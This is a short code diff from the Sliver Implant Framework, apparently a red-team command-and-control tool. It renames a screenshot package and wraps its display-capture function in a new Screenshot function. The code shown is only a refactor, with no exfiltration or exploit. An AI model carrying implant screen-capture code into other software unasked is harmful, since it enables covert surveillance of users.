@@ -1,4 +1,4 @@
-package screenshot
+package screen
 
 /*
 	Sliver Implant Framework
@@ -28,8 +28,13 @@ import (
 	screen "github.com/kbinani/screenshot"
 )
 
-// Capture - Retrieve the screenshot of the active displays
-func Capture() []byte {
+//Screenshot - Retrieve the screenshot of the active displays
+func Screenshot() []byte {
+	return WindowsCapture()
+}
+
+// WindowsCapture - Retrieve the screenshot of the active displays
+func WindowsCapture() []byte {
 	nDisplays := screen.NumActiveDisplays()
 
 	var height, width int = 0, 0
